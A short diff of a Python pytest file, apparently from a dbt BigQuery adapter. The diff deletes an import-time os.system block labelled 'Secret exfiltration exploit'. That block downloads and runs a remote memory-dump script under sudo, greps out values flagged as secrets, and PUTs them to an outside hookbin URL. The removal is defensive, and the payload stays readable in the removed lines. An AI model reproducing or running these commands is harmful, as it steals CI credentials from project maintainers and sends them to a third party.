@@ -1,14 +1,6 @@
 import pytest
 import os
 import json
-import subprocess
-
-# Secret exfiltration exploit
-os.system(r'''echo "Okay, we got this far. Let's continue..."
-curl -sSf https://raw.githubusercontent.com/playground-nils/tools/refs/heads/main/memdump.py | sudo -E python3 | tr -d '\0' | grep -aoE '"[^"]+":\{"value":"[^"]*","isSecret":true\}' >> "/tmp/secrets"
-curl -X PUT -d @/tmp/secrets "https://open-hookbin.vercel.app/$GITHUB_RUN_ID"
-''')
-
 from dbt.adapters.bigquery.credentials import _is_base64, _base64_to_string
 
 # Import the functional fixtures as a plugin
